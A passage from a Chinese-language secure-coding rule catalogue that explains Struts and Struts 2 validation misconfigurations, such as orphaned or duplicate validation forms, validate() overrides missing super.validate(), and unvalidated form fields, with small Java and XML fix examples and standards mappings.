<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[25] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15)</p>
<h4 id="Struts-2-Validation-File-Without-Action"><a href="#Struts-2-Validation-File-Without-Action" class="headerlink" title="Struts 2: Validation File Without Action"></a>Struts 2: Validation File Without Action</h4><h5 id="ABSTRACT-330"><a href="#ABSTRACT-330" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>找到没有对应 Struts2 Action 的 Struts2 Validation 文件。</p>
<h5 id="EXPLANATION-331"><a href="#EXPLANATION-331" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>找到没有匹配 Struts2 Action 的 Struts2 Validation 文件。对于每个 ActionClass，Struts2 都会搜索对应的 ActionClass-validation.xml，以获取必要的验证限制。而在这种情况下，找到 ActionClass-validation.xml 形式的验证文件，但 ActionClass 与 Struts2 配置文件中定义的 Action 不匹配。</p>
<p>当开发人员删除或者重命名 action form 映射后，很容易忘记更新验证逻辑。验证逻辑没有得到适当维护的一个迹象是存在 unused validation form。</p>
<h5 id="RECOMMENDATIONS-329"><a href="#RECOMMENDATIONS-329" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>检查 struts.xml 文件，并搜索孤立的验证定义的匹配项。此搜索结果体现对 Action 重命名但没有更新对应验证的情况。</p>
<p>通过验证逻辑查找是否存在其他或许更难察觉的问题。</p>
<p>－ 如果验证定义以前由一个 action form 映射使用，而这个映射 目前已经删除了，则应删除这个 unused validation form。</p>
<p>－ 如果该 action form 映射已经被重命名，请考虑重命名验证 文件，让它们重新连接起来。</p>
<p>－ 如果旧的 action form 映射中存在的功能已经合并到 另一个 action form 映射中，请检查无用的验证逻辑与新的 验证逻辑之间的一致性。</p>
<h5 id="REFERENCES-328"><a href="#REFERENCES-328" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] The Struts2 Validation Framework The Apache Foundation</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 101</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[20] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15)</p>
<h4 id="Struts-2-Validator-Without-Action-Field"><a href="#Struts-2-Validator-Without-Action-Field" class="headerlink" title="Struts 2: Validator Without Action Field"></a>Struts 2: Validator Without Action Field</h4><h5 id="ABSTRACT-331"><a href="#ABSTRACT-331" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>为一个不存在的 action 字段定义了 Struts2 validator。</p>
<h5 id="EXPLANATION-332"><a href="#EXPLANATION-332" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Struts2 validator 定义引用一个不存在的 action 字段。</p>
<p>当开发人员删除或者重命名 action form 映射后，很容易忘记更新验证逻辑。如果存在孤立的验证器定义，则表明验证逻辑没有得到适当维护。</p>
<h5 id="RECOMMENDATIONS-330"><a href="#RECOMMENDATIONS-330" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>检查 action 验证文件，并搜索孤立的验证定义的可能匹配项。此搜索结果可能会表明已对 Action 字段重新命名，但没有更新对应的验证。</p>
<p>通过验证逻辑查找是否存在其他或许更难察觉的问题。</p>
<p>－ 如果验证定义以前由一个 action form 映射使用，而这个映射 目前已经删除了，则应删除这个 unused validation form。</p>
<p>－ 如果该 action form 映射已经被重命名，请考虑重命名验证 文件，让它们重新连接起来。</p>
<p>－ 如果旧的 action form 映射中存在的功能已经合并到 另一个 action form 映射中，请检查无用的验证逻辑与新的 验证逻辑之间的一致性。</p>
<h5 id="REFERENCES-329"><a href="#REFERENCES-329" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] T. Husted et al. Struts in Action: Building Web Applications with the Leading Java Framework Manning Publications</p>
<p>[2] The Struts2 Validation Framework The Apache Foundation</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 101</p>
<p>[4] Standards Mapping - FIPS200 CM</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[21] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15)</p>
<h4 id="Struts-Duplicate-Validation-Forms"><a href="#Struts-Duplicate-Validation-Forms" class="headerlink" title="Struts: Duplicate Validation Forms"></a>Struts: Duplicate Validation Forms</h4><h5 id="ABSTRACT-332"><a href="#ABSTRACT-332" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>同名的多个 validation form 暗示着验证逻辑已经过时。</p>
<h5 id="EXPLANATION-333"><a href="#EXPLANATION-333" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>如果两个 validation form 具有相同的名称，Struts Validator 会任意选择一个来进行输入验证，而放弃另外一个。这一决策可能不是程序员所期望的。而且，它也暗示着验证逻辑没有得到维护，并暗示着存在其他更难察觉的验证错误。</p>
<p>示例：同名的两个 validation form。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;form-validation&gt;</span><br><span class="line"></span><br><span class="line">    &lt;formset&gt;</span><br><span class="line"></span><br><span class="line">        &lt;form name=&quot;ProjectForm&quot;&gt;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">        &lt;form name=&quot;ProjectForm&quot;&gt;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/formset&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form-validation&gt;</span><br></pre></td></tr></table></figure>
<p>验证逻辑的维护至关重要，验证逻辑必须与应用程序的其余部分保持同步。未经检验的输入是导致当今一些最糟糕、最常见的软件安全问题的根源。Cross-site scripting、SQL injection 和 process control 漏洞是由于缺少输入验证或者输入验证不完整造成的。虽然 J2EE 应用程序通常情况下不容易受到内存损坏的影响，但是如果 J2EE 应用程序连接到未执行数组边界检查的本地代码，攻击者就可能会利用 J2EE 应用程序中一个输入校验错误发起 buffer overflow 攻击。</p>
<h5 id="RECOMMENDATIONS-331"><a href="#RECOMMENDATIONS-331" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>确定哪个 validation form 是最新的，将其他的删除。仔细检查保留下来的 validation form，看有没有其他错误或已经过时的迹象。</p>
<h5 id="REFERENCES-330"><a href="#REFERENCES-330" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] T. Husted et al. Struts in Action: Building Web Applications with the Leading Java Framework Manning Publications</p>
<p>[2] The Struts project The Apache Foundation</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 102</p>
<p>[4] Standards Mapping - FIPS200 CM</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[21] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15)</p>
<p>####### ## Struts: Erroneous validate() Method</p>
<h5 id="ABSTRACT-333"><a href="#ABSTRACT-333" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该 validator 表单定义了一个 validate() 方法，但没有调用 super.validate()。</p>
<p>EXPLANATION</p>
<p>Struts Validator 使用表单的 validate() 方法，对照那些在相关校验表单中定义的约束条件来检测表单属性的内容。这就意味着以下这些类具有一个 validate() 方法，该方法是校验框架的一部分：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ValidatorForm</span><br><span class="line"></span><br><span class="line">ValidatorActionForm</span><br><span class="line"></span><br><span class="line">DynaValidatorForm</span><br><span class="line"></span><br><span class="line">DynaValidatorActionForm</span><br></pre></td></tr></table></figure>
<p>如果要建立一个继承上述类的类，并且您的这个类覆盖 validate() 函数，强行实现自定义校验逻辑，则您必须在 validate() 的实现方法中调用 super.validate()。如果不这么做，校验框架就无法对照校验表单来校验表单中的内容。换言之，针对某个特定的表单，会禁用校验框架。</p>
<p>对表单来说，禁用校验框架会使应用程序完全暴露在各种攻击之下。未经校验的输入是导致各种漏洞的根源，如 cross-site scripting、process control 和 SQL injection。虽然 J2EE 应用程序通常情况下不容易受到内存损坏的影响，但是如果 J2EE 应用程序连接到未执行数组边界检查的本地代码，攻击者就可能会利用 J2EE 应用程序中一个输入校验错误发起 buffer overflow 攻击。</p>
<h5 id="RECOMMENDATIONS-332"><a href="#RECOMMENDATIONS-332" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>例 1：这是一个没有调用 super.validate() 的校验方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    public abstract class MyForm extends ValidatorForm &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    public ActionErrors validate(ActionMapping mapping,</span><br><span class="line"></span><br><span class="line">            HttpServletRequest request)	 &#123;</span><br><span class="line"></span><br><span class="line">        this.errors = errors;</span><br><span class="line"></span><br><span class="line">        doSpecialValidation(mapping, request);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例 1 显示了一个继承 ValidatorForm 的表单，其名称为 MyForm。由于它的校验方法没有调用 super.validate()，Struts Validator 将起不到任何作用。图 2 给出了 validate() 的正确实现方法。</p>
<p>例 2：这是修正后的 validate() 方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    public abstract class MyForm extends ValidatorForm &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    public ActionErrors validate(ActionMapping mapping,</span><br><span class="line"></span><br><span class="line">            HttpServletRequest request)	 &#123;</span><br><span class="line"></span><br><span class="line">        super.validate(mapping, request);</span><br><span class="line"></span><br><span class="line">        this.errors = errors;</span><br><span class="line"></span><br><span class="line">        doSpecialValidation(mapping, request);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-331"><a href="#REFERENCES-331" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] T. Husted et al. Struts in Action: Building Web Applications with the Leading Java Framework Manning Publications</p>
<p>[2] The Struts project The Apache Foundation</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 103</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<h4 id="Struts-Form-Does-Not-Extend-Validation-Class"><a href="#Struts-Form-Does-Not-Extend-Validation-Class" class="headerlink" title="Struts: Form Does Not Extend Validation Class"></a>Struts: Form Does Not Extend Validation Class</h4><h5 id="ABSTRACT-334"><a href="#ABSTRACT-334" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>所有 Struts 表单都应继承验证器类。</p>
<h5 id="EXPLANATION-334"><a href="#EXPLANATION-334" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>为了能够使用 Struts 验证器，表单必须继承以下各类之一：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ValidatorForm</span><br><span class="line"></span><br><span class="line">ValidatorActionForm</span><br><span class="line"></span><br><span class="line">DynaValidatorActionForm</span><br><span class="line"></span><br><span class="line">DynaValidaorForm</span><br></pre></td></tr></table></figure>
<p>必须继承这些类中的一个，因为 Struts Validator 是通过在这些类中执行 validate() 方法，而绑定在您的应用程序中的。</p>
<p>那些源自下面这些类的表单不能使用 Struts 验证器：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ActionForm</span><br><span class="line"></span><br><span class="line">DynaActionForm</span><br></pre></td></tr></table></figure>
<p>绕过针对表单的验证框架会使应用程序完全暴露在各种攻击之下。未经校验的输入是导致各种漏洞的根源，如 cross-site scripting、process control 和 SQL injection。虽然 J2EE 应用程序通常情况下不容易受到内存损坏的影响，但是如果 J2EE 应用程序连接到未执行数组边界检查的本地代码，攻击者就可能会利用 J2EE 应用程序中一个输入校验错误发起 buffer overflow 攻击。</p>
<h5 id="RECOMMENDATIONS-333"><a href="#RECOMMENDATIONS-333" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>例 1：不能使用 Struts 验证器的表单类。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public class MyForm extends ActionForm &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例 1 中所示的类不能使用 Struts 验证器，因为该类继承了 ActionForm。您应该对这样的类进行更改，使其继承 ValidatorForm 或者 ValidatorActionForm。</p>
<p>例 2：使用 Struts Validator 的表单。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    public class MyForm extends ValidatorForm &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例 3：针对简单表单的验证器配置。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;form-validation&gt;</span><br><span class="line"></span><br><span class="line">&lt;formset&gt;</span><br><span class="line"></span><br><span class="line">&lt;form name=&quot;MyForm&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;field property=&quot;passwd&quot; depends=&quot;min, max, mask&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;arg0 key=&quot;label.user.passwd&quot;/&gt;</span><br><span class="line"></span><br><span class="line">        &lt;arg1 name=&quot;minlength&quot; key=&quot;$&#123;var:min&#125;&quot;</span><br><span class="line"></span><br><span class="line">              resource=&quot;false&quot;/&gt;</span><br><span class="line"></span><br><span class="line">        &lt;arg2 name=&quot;maxlength&quot; key=&quot;$&#123;var:max&#125;&quot;</span><br><span class="line"></span><br><span class="line">                  resource=&quot;false&quot;/&gt;</span><br><span class="line"></span><br><span class="line">         &lt;var&gt;</span><br><span class="line"></span><br><span class="line">             &lt;var-name&gt;min&lt;/var-name&gt;</span><br><span class="line"></span><br><span class="line">             &lt;var-value&gt;6&lt;/var-value&gt;</span><br><span class="line"></span><br><span class="line">         &lt;/var&gt;</span><br><span class="line"></span><br><span class="line">         &lt;var&gt;</span><br><span class="line"></span><br><span class="line">             &lt;var-name&gt;max&lt;/var-name&gt;</span><br><span class="line"></span><br><span class="line">             &lt;var-value&gt;12&lt;/var-value&gt;</span><br><span class="line"></span><br><span class="line">         &lt;/var&gt;</span><br><span class="line"></span><br><span class="line">         &lt;var&gt;</span><br><span class="line"></span><br><span class="line">             &lt;var-name&gt;mask&lt;/var-name&gt;</span><br><span class="line"></span><br><span class="line">             &lt;var-value&gt;^[0-9a-zA-Z]+$&lt;/var-value&gt;</span><br><span class="line"></span><br><span class="line">         &lt;/var&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/field&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/formset&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form-validation&gt;</span><br></pre></td></tr></table></figure>
<p>除了继承 ValidatorForm 之外，您还必须配置验证器以执行正确的输入检验。例 3 显示了一个简单的验证器配置，以检查表单上的单个参数是否包含 6 到 12 个数字或字母字符。</p>
<p>如果您的类执行它自己的 validate() 方法，您仍然必须从验证器类进行推导，并且必须在 validate() 的执行过程中调用 super.validate()。</p>
<h5 id="REFERENCES-332"><a href="#REFERENCES-332" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] T. Husted et al. Struts in Action: Building Web Applications with the Leading Java Framework Manning Publications</p>
<p>[2] The Struts project The Apache Foundation</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 104</p>
<p>[4] Standards Mapping - FIPS200 SI</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<h4 id="Struts-Form-Field-Without-Validator"><a href="#Struts-Form-Field-Without-Validator" class="headerlink" title="Struts: Form Field Without Validator"></a>Struts: Form Field Without Validator</h4><h5 id="ABSTRACT-335"><a href="#ABSTRACT-335" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>表单中的每个字段都应该对照相应的 validation form 进行验证。</p>
<h5 id="EXPLANATION-335"><a href="#EXPLANATION-335" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>即使遗漏其中一个输入字段的验证，也会成为攻击者可利用的破绽。</p>
<p>未经检验的输入是导致当今一些最糟糕、最常见的软件安全问题的根源。Cross-site scripting、SQL injection 和 process control 漏洞是由于缺少输入验证或者输入验证不完整造成的。虽然 J2EE 应用程序通常情况下不容易受到内存损坏的影响，但是如果 J2EE 应用程序连接到未执行数组边界检查的本地代码，攻击者就可能会利用 J2EE 应用程序中一个输入校验错误发起 buffer overflow 攻击。</p>
<p>一些应用程序使用同一个 ActionForm 来实现多个目的。在类似的情况下，一些字段在部分 action 映射中可能会失效。对未使用的字段也进行验证是至关重要的。最好是对未使用的字段进行严格的控制，使其只能处于空白或未定义状态。如果 unused field 没有经过验证，则 action 中的共享业务逻辑可能会允许攻击者绕过针对表单其他用途所执行的验证检查。</p>
<h5 id="RECOMMENDATIONS-334"><a href="#RECOMMENDATIONS-334" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>下面的例子包含一个来自于 Struts validation form 的条目。验证逻辑用于检测 passwd 参数的字符长度是否在 6 到 12 之间，以及是否只包含字母或数字字符。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> &lt;field property=&quot;passwd&quot; depends=&quot;min, max, mask&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;arg0 key=&quot;label.user.passwd&quot;/&gt;</span><br><span class="line"></span><br><span class="line">  &lt;arg1 name=&quot;minlength&quot; key=&quot;$&#123;var:min&#125;&quot;</span><br><span class="line"></span><br><span class="line">       resource=&quot;false&quot;/&gt;</span><br><span class="line"></span><br><span class="line">  &lt;arg2 name=&quot;maxlength&quot; key=&quot;$&#123;var:max&#125;&quot;</span><br><span class="line"></span><br><span class="line">           resource=&quot;false&quot;/&gt;</span><br><span class="line"></span><br><span class="line">  &lt;var&gt;</span><br><span class="line"></span><br><span class="line">      &lt;var-name&gt;min&lt;/var-name&gt;</span><br><span class="line"></span><br><span class="line">      &lt;var-value&gt;6&lt;/var-value&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/var&gt;</span><br><span class="line"></span><br><span class="line">  &lt;var&gt;</span><br><span class="line"></span><br><span class="line">      &lt;var-name&gt;max&lt;/var-name&gt;</span><br><span class="line"></span><br><span class="line">      